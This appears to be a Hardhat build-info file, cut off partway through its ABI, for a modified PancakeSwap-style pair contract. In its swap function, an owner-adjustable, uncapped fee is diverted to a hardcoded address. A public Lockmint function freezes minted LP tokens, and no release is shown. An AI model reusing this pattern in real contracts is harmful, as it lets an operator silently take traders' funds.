{
	"id": "2c06a68c90028ebdbecef68e76bd4522",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.5.16",
	"solcLongVersion": "0.5.16+commit.9c3226ce",
	"input": {
		"language": "Solidity",
		"sources": {
			"Pair.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity =0.5.16;\n\nimport \"./IPair.sol\";\nimport \"./ERC20.sol\";\nimport \"./Math.sol\";\nimport \"./UQ112x112.sol\";\nimport \"./IERC20.sol\";\nimport \"./IFactory.sol\";\nimport \"./ICallee.sol\";\n\ncontract Pair is IPair, ERC20 {\n    using SafeMath for uint;\n    using UQ112x112 for uint224;\n\n    address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c;\n\n    uint public constant MINIMUM_LIQUIDITY = 10 ** 3;\n    bytes4 private constant SELECTOR =\n        bytes4(keccak256(bytes(\"transfer(address,uint256)\")));\n\n    address public factory;\n    address public token0;\n    address public token1;\n    uint public taxfee;\n\n    uint112 private reserve0; // uses single storage slot, accessible via getReserves\n    uint112 private reserve1; // uses single storage slot, accessible via getReserves\n    uint32 private blockTimestampLast; // uses single storage slot, accessible via getReserves\n\n    uint public price0CumulativeLast;\n    uint public price1CumulativeLast;\n    uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event\n     address public owner;\n    uint private unlocked = 1;\n    modifier lock() {\n        require(unlocked == 1, \"Pancake: LOCKED\");\n        unlocked = 0;\n        _;\n        unlocked = 1;\n    }\n\n    // Modifier to restrict function calls to the owner\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function\");\n        _;\n    }\n\n    function taxfeeupdate(uint _newtax) public onlyOwner {\n        taxfee = _newtax; // Update the tax fee variable\n    }  \n\n    function getReserves()\n        public\n        view\n        returns (\n            uint112 _reserve0,\n            uint112 _reserve1,\n            uint32 _blockTimestampLast\n        )\n    {\n        _reserve0 = reserve0;\n        _reserve1 = reserve1;\n        _blockTimestampLast = blockTimestampLast;\n    }\n\n    function _safeTransfer(address token, address to, uint value) private {\n        (bool success, bytes memory data) = token.call(\n            abi.encodeWithSelector(SELECTOR, to, value)\n        );\n        require(\n            success && (data.length == 0 || abi.decode(data, (bool))),\n            \"Pancake: TRANSFER_FAILED\"\n        );\n    }\n\n    event Mint(address indexed sender, uint amount0, uint amount1);\n    event Burn(\n        address indexed sender,\n        uint amount0,\n        uint amount1,\n        address indexed to\n    );\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    constructor() public {\n        factory = msg.sender;\n         owner = msg.sender;\n    }\n\n    // called once by the factory at time of deployment\n    function initialize(\n        address _token0,\n        address _token1,\n        uint _taxfee\n    ) external {\n        require(msg.sender == factory, \"Pancake: FORBIDDEN\"); // sufficient check\n        token0 = _token0;\n        token1 = _token1;\n        taxfee = _taxfee;\n    }\n\n    // update reserves and, on the first call per block, price accumulators\n    function _update(\n        uint balance0,\n        uint balance1,\n        uint112 _reserve0,\n        uint112 _reserve1\n    ) private {\n        require(\n            balance0 <= uint112(-1) && balance1 <= uint112(-1),\n            \"Pancake: OVERFLOW\"\n        );\n        uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);\n        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {\n            // * never overflows, and + overflow is desired\n            price0CumulativeLast +=\n                uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *\n                timeElapsed;\n            price1CumulativeLast +=\n                uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *\n                timeElapsed;\n        }\n        reserve0 = uint112(balance0);\n        reserve1 = uint112(balance1);\n        blockTimestampLast = blockTimestamp;\n        emit Sync(reserve0, reserve1);\n    }\n\n    // if fee is on, mint liquidity equivalent to 8/25 of the growth in sqrt(k)\n    function _mintFee(\n        uint112 _reserve0,\n        uint112 _reserve1\n    ) private returns (bool feeOn) {\n        address feeTo = IFactory(factory).feeTo();\n        feeOn = feeTo != address(0);\n        uint _kLast = kLast; // gas savings\n        if (feeOn) {\n            if (_kLast != 0) {\n                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));\n                uint rootKLast = Math.sqrt(_kLast);\n                if (rootK > rootKLast) {\n                    uint numerator = totalSupply.mul(rootK.sub(rootKLast)).mul(\n                        8\n                    );\n                    uint denominator = rootK.mul(17).add(rootKLast.mul(8));\n                    uint liquidity = numerator / denominator;\n                    if (liquidity > 0) _mint(feeTo, liquidity);\n                }\n            }\n        } else if (_kLast != 0) {\n            kLast = 0;\n        }\n    }\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function mint(address to) external lock returns (uint liquidity) {\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        uint balance0 = IERC20(token0).balanceOf(address(this));\n        uint balance1 = IERC20(token1).balanceOf(address(this));\n        uint amount0 = balance0.sub(_reserve0);\n        uint amount1 = balance1.sub(_reserve1);\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        if (_totalSupply == 0) {\n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n            _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        } else {\n            liquidity = Math.min(\n                amount0.mul(_totalSupply) / _reserve0,\n                amount1.mul(_totalSupply) / _reserve1\n            );\n        }\n        require(liquidity > 0, \"Pancake: INSUFFICIENT_LIQUIDITY_MINTED\");\n        _mint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Mint(msg.sender, amount0, amount1);\n    }\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function Lockmint(address to) external lock returns (uint liquidity) {\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        uint balance0 = IERC20(token0).balanceOf(address(this));\n        uint balance1 = IERC20(token1).balanceOf(address(this));\n        uint amount0 = balance0.sub(_reserve0);\n        uint amount1 = balance1.sub(_reserve1);\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        if (_totalSupply == 0) {\n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n            freezeMint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        } else {\n            liquidity = Math.min(\n                amount0.mul(_totalSupply) / _reserve0,\n                amount1.mul(_totalSupply) / _reserve1\n            );\n        }\n        require(liquidity > 0, \"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\");\n        freezeMint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Mint(msg.sender, amount0, amount1);\n    }\n\n    // this low-level function should be called from a contract which performs important safety checks\n    function burn(\n        address to\n    ) external lock returns (uint amount0, uint amount1) {\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n        uint balance0 = IERC20(_token0).balanceOf(address(this));\n        uint balance1 = IERC20(_token1).balanceOf(address(this));\n        uint liquidity = balanceOf[address(this)];\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n        require(\n            amount0 > 0 && amount1 > 0,\n            \"Pancake: INSUFFICIENT_LIQUIDITY_BURNED\"\n        );\n        _burn(address(this), liquidity);\n        _safeTransfer(_token0, to, amount0);\n        _safeTransfer(_token1, to, amount1);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Burn(msg.sender, amount0, amount1, to);\n    }\n\n    //og\n    // this low-level function should be called from a contract which performs important safety checks\n    /*    function swap(\n        uint amount0Out,\n        uint amount1Out,\n        address to,\n        bytes calldata data\n    ) external lock {\n        require(\n            amount0Out > 0 || amount1Out > 0,\n            \"Pancake: INSUFFICIENT_OUTPUT_AMOUNT\"\n        );\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        require(\n            amount0Out < _reserve0 && amount1Out < _reserve1,\n            \"Pancake: INSUFFICIENT_LIQUIDITY\"\n        );\n\n        uint balance0;\n        uint balance1;\n        {\n            // scope for _token{0,1}, avoids stack too deep errors\n            address _token0 = token0;\n            address _token1 = token1;\n            require(to != _token0 && to != _token1, \"Pancake: INVALID_TO\");\n            if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n            if (data.length > 0)\n                IPancakeCallee(to).pancakeCall(\n                    msg.sender,\n                    amount0Out,\n                    amount1Out,\n                    data\n                );\n            balance0 = IERC20(_token0).balanceOf(address(this));\n            balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out\n            ? balance0 - (_reserve0 - amount0Out)\n            : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out\n            ? balance1 - (_reserve1 - amount1Out)\n            : 0;\n        require(\n            amount0In > 0 || amount1In > 0,\n            \"Pancake: INSUFFICIENT_INPUT_AMOUNT\"\n        );\n        {\n            // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n            uint balance0Adjusted = (\n                balance0.mul(10000).sub(amount0In.mul(25))\n            );\n            uint balance1Adjusted = (\n                balance1.mul(10000).sub(amount1In.mul(25))\n            );\n            require(\n                balance0Adjusted.mul(balance1Adjusted) >=\n                    uint(_reserve0).mul(_reserve1).mul(10000 ** 2),\n                \"Pancake: K\"\n            );\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n*/\n    // custom\n\n    function swap(\n        uint amount0Out,\n        uint amount1Out,\n        address to,\n        bytes calldata data\n    ) external lock {\n        require(\n            amount0Out > 0 || amount1Out > 0,\n            \"Pancake: INSUFFICIENT_OUTPUT_AMOUNT\"\n        );\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        require(\n            amount0Out < _reserve0 && amount1Out < _reserve1,\n            \"Pancake: INSUFFICIENT_LIQUIDITY\"\n        );\n\n        uint balance0;\n        uint balance1;\n        {\n            uint taxamount0Out = amount0Out - (amount0Out * taxfee) / 100;\n            uint taxamount1Out = amount1Out - (amount1Out * taxfee) / 100;\n\n            // scope for _token{0,1}, avoids stack too deep errors\n            address _token0 = token0;\n            address _token1 = token1;\n            require(to != _token0 && to != _token1, \"Pancake: INVALID_TO\");\n            if (amount0Out > 0) _safeTransfer(_token0, to, taxamount0Out); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, to, taxamount1Out); // optimistically transfer tokens\n            if (data.length > 0)\n                ICallee(to).pancakeCall(\n                    msg.sender,\n                    taxamount0Out, // amount0Out,\n                    taxamount1Out, //  amount1Out,\n                    data\n                );\n\n            uint tax0 = (amount0Out * taxfee) / 100;\n            uint tax1 = (amount1Out * taxfee) / 100;\n\n            if (amount0Out > 0) _safeTransfer(_token0, FeeResiver, tax0); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, FeeResiver, tax1); // optimistically transfer tokens\n            balance0 = IERC20(_token0).balanceOf(address(this));\n            balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out\n            ? balance0 - (_reserve0 - amount0Out)\n            : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out\n            ? balance1 - (_reserve1 - amount1Out)\n            : 0;\n        require(\n            amount0In > 0 || amount1In > 0,\n            \"Pancake: INSUFFICIENT_INPUT_AMOUNT\"\n        );\n        {\n            // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n            uint balance0Adjusted = (\n                balance0.mul(10000).sub(amount0In.mul(25))\n            );\n            uint balance1Adjusted = (\n                balance1.mul(10000).sub(amount1In.mul(25))\n            );\n            require(\n                balance0Adjusted.mul(balance1Adjusted) >=\n                    uint(_reserve0).mul(_reserve1).mul(10000 ** 2),\n                \"Pancake: K\"\n            );\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    /*  // this low-level function should be called from a contract which performs important safety checks\n    function swap(\n        uint amount0Out,\n        uint amount1Out,\n        address to,\n        bytes calldata data\n    ) external lock {\n        require(\n            amount0Out > 0 || amount1Out > 0,\n            \"UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT\"\n        );\n        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings\n        require(\n            amount0Out < _reserve0 && amount1Out < _reserve1,\n            \"UniswapV2: INSUFFICIENT_LIQUIDITY\"\n        );\n\n        uint balance0;\n        uint balance1;\n\n        {\n            // scope for _token{0,1}, avoids stack too deep errors\n            address _token0 = token0;\n            address _token1 = token1;\n\n            uint taxamount0Out = amount0Out - (amount0Out * 5) / 100;\n            uint taxamount1Out = amount1Out - (amount1Out * 5) / 100;\n\n            require(to != _token0 && to != _token1, \"UniswapV2: INVALID_TO\");\n\n            if (amount0Out > 0) _safeTransfer(_token0, to, taxamount0Out); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, to, taxamount1Out); // optimistically transfer tokens\n            // if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);\n            if (data.length > 0)\n                IPancakeCallee(to).pancakeCall(\n                    msg.sender,\n                    taxamount0Out,\n                    taxamount1Out,\n                    data\n                );\n            uint tax0 = (amount0Out * 5) / 100;\n            uint tax1 = (amount1Out * 5) / 100;\n\n            if (amount0Out > 0) _safeTransfer(_token0, FeeResiver, tax0); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, FeeResiver, tax1); // optimistically transfer tokens\n            // _safeTransfer(_token0, FeeResiver, tax0);\n            // _safeTransfer(_token1, FeeResiver, tax1);\n\n            balance0 = IERC20(_token0).balanceOf(address(this));\n            balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n\n        uint amount0In = balance0 > _reserve0 - amount0Out\n            ? balance0 - (_reserve0 - amount0Out)\n            : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out\n            ? balance1 - (_reserve1 - amount1Out)\n            : 0;\n        require(\n            amount0In > 0 || amount1In > 0,\n            \"UniswapV2: INSUFFICIENT_INPUT_AMOUNT\"\n        );\n        {\n            // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n             uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\n              uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\n              require(\n                balance0Adjusted.mul(balance1Adjusted) >=\n                    uint(_reserve0).mul(_reserve1).mul(1000 ** 2),\n                \"UniswapV2: K\"\n            ); \n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n        // emit Swap(msg.sender, amount0In, amount1In, taxamount0Out0, taxamount1Out1, to);\n    }\n*/\n\n    // force balances to match reserves\n    function skim(address to) external lock {\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n        _safeTransfer(\n            _token0,\n            to,\n            IERC20(_token0).balanceOf(address(this)).sub(reserve0)\n        );\n        _safeTransfer(\n            _token1,\n            to,\n            IERC20(_token1).balanceOf(address(this)).sub(reserve1)\n        );\n    }\n\n    // force reserves to match balances\n    function sync() external lock {\n        _update(\n            IERC20(token0).balanceOf(address(this)),\n            IERC20(token1).balanceOf(address(this)),\n            reserve0,\n            reserve1\n        );\n    }\n}\n"
			},
			"ICallee.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.5.0;\n\ninterface ICallee {\n    function pancakeCall(\n        address sender,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n}\n"
			},
			"IFactory.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.5.0;\n\ninterface IFactory {\n    event PairCreated(\n        address indexed token0,\n        address indexed token1,\n        address pair,\n        uint256\n    );\n\n    function feeTo() external view returns (address);\n\n    function feeToSetter() external view returns (address);\n\n    function getPair(\n        address tokenA,\n        address tokenB\n    ) external view returns (address pair);\n\n    function allPairs(uint256) external view returns (address pair);\n\n    function allPairsLength() external view returns (uint256);\n\n    function createPair(\n        address tokenA,\n        address tokenB\n    ) external returns (address pair);\n\n    function setFeeTo(address) external;\n\n    function setFeeToSetter(address) external;\n\n    function INIT_CODE_PAIR_HASH() external view returns (bytes32);\n}\n"
			},
			"IERC20.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.5.0;\n\ninterface IERC20 {\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function name() external pure  returns (string memory);\n\n    function symbol() external pure returns (string memory);\n\n    function decimals() external pure returns (uint8);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address owner) external view returns (uint256);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint256);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n}\n"
			},
			"UQ112x112.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity =0.5.16;\n\n// a library for handling binary fixed point numbers (https://en.wikipedia.org/wiki/Q_(number_format))\n\n// range: [0, 2**112 - 1]\n// resolution: 1 / 2**112\n\nlibrary UQ112x112 {\n    uint224 constant Q112 = 2 ** 112;\n\n    // encode a uint112 as a UQ112x112\n    function encode(uint112 y) internal pure returns (uint224 z) {\n        z = uint224(y) * Q112; // never overflows\n    }\n\n    // divide a UQ112x112 by a uint112, returning a UQ112x112\n    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {\n        z = x / uint224(y);\n    }\n}\n"
			},
			"Math.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity =0.5.16;\n\n// a library for performing various math operations\n\nlibrary Math {\n    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = x < y ? x : y;\n    }\n\n    // babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)\n    function sqrt(uint256 y) internal pure returns (uint256 z) {\n        if (y > 3) {\n            z = y;\n            uint256 x = y / 2 + 1;\n            while (x < z) {\n                z = x;\n                x = (y / x + x) / 2;\n            }\n        } else if (y != 0) {\n            z = 1;\n        }\n    }\n}\n"
			},
			"ERC20.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity =0.5.16;\n\nimport \"./IERC20.sol\";\nimport \"./SafeMath.sol\";\n\ncontract ERC20 is IERC20 {\n    using SafeMath for uint256;\n\n    string public constant name = \"KBC LPs\";\n    string public constant symbol = \"KBC-LP\";\n    uint8 public constant decimals = 18;\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    mapping(address => uint256) public _frozenBalance;\n\n    bytes32 public DOMAIN_SEPARATOR;\n    // keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n    bytes32 public constant PERMIT_TYPEHASH =\n        0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n    mapping(address => uint256) public nonces;\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor() public {\n        uint256 chainId;\n        assembly {\n            chainId := chainid\n        }\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                keccak256(\n                    \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n                ),\n                keccak256(bytes(name)),\n                keccak256(bytes(\"1\")),\n                chainId,\n                address(this)\n            )\n        );\n    }\n\n    function _mint(address to, uint256 value) internal {\n        totalSupply = totalSupply.add(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(address(0), to, value);\n    }\n\n    function freezeMint(\n        address account,\n        uint256 amount\n    ) internal returns (bool) {\n        // custom\n        // override\n        require(account != address(0), \"BEP20: mint to the zero address\");\n        // require(owners[msg.sender],\"only Owner freeze Token\");\n        totalSupply = totalSupply.add(amount);\n        _frozenBalance[account] = _frozenBalance[account].add(amount);\n        emit Transfer(address(0), account, amount);\n        return true;\n    }\n\n    function _burn(address from, uint256 value) internal {\n        balanceOf[from] = balanceOf[from].sub(value);\n        totalSupply = totalSupply.sub(value);\n        emit Transfer(from, address(0), value);\n    }\n\n    function _approve(address owner, address spender, uint256 value) private {\n        allowance[owner][spender] = value;\n        emit Approval(owner, spender, value);\n    }\n\n    function _transfer(address from, address to, uint256 value) private {\n        balanceOf[from] = balanceOf[from].sub(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(from, to, value);\n    }\n\n    function approve(address spender, uint256 value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n    function transfer(address to, uint256 value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool) {\n        if (allowance[from][msg.sender] != uint256(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(\n                value\n            );\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        require(deadline >= block.timestamp, \"Pancake: EXPIRED\");\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                DOMAIN_SEPARATOR,\n                keccak256(\n                    abi.encode(\n                        PERMIT_TYPEHASH,\n                        owner,\n                        spender,\n                        value,\n                        nonces[owner]++,\n                        deadline\n                    )\n                )\n            )\n        );\n        address recoveredAddress = ecrecover(digest, v, r, s);\n        require(\n            recoveredAddress != address(0) && recoveredAddress == owner,\n            \"Pancake: INVALID_SIGNATURE\"\n        );\n        _approve(owner, spender, value);\n    }\n}\n"
			},
			"IPair.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.5.0;\n\ninterface IPair {\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function name() external pure returns (string memory);\n\n    function symbol() external pure returns (string memory);\n\n    function decimals() external pure returns (uint8);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address owner) external view returns (uint256);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint256);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n\n    function nonces(address owner) external view returns (uint256);\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n    event Burn(\n        address indexed sender,\n        uint256 amount0,\n        uint256 amount1,\n        address indexed to\n    );\n    event Swap(\n        address indexed sender,\n        uint256 amount0In,\n        uint256 amount1In,\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\n\n    function factory() external view returns (address);\n\n    function token0() external view returns (address);\n\n    function token1() external view returns (address);\n\n    function getReserves()\n        external\n        view\n        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n\n    function price0CumulativeLast() external view returns (uint256);\n\n    function price1CumulativeLast() external view returns (uint256);\n\n    function kLast() external view returns (uint256);\n\n    function mint(address to) external returns (uint256 liquidity);\n\n    function Lockmint(address to) external returns (uint256 liquidity); // custom\n\n    function burn(\n        address to\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    function swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes calldata data\n    ) external;\n\n    function skim(address to) external;\n\n    function sync() external;\n\n    function initialize(address, address, uint) external; // custom\n}\n"
			},
			"SafeMath.sol": {
				"content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.5.0 <0.7.0;\n\n// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)\n\nlibrary SafeMath {\n    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x + y) >= x, \"ds-math-add-overflow\");\n    }\n\n    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x - y) <= x, \"ds-math-sub-underflow\");\n    }\n\n    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\");\n    }\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": true,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"ERC20.sol": {
				"ERC20": {
					"abi": [
						{
							"inputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "DOMAIN_SEPARATOR",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "PERMIT_TYPEHASH",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "_frozenBalance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "nonces",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
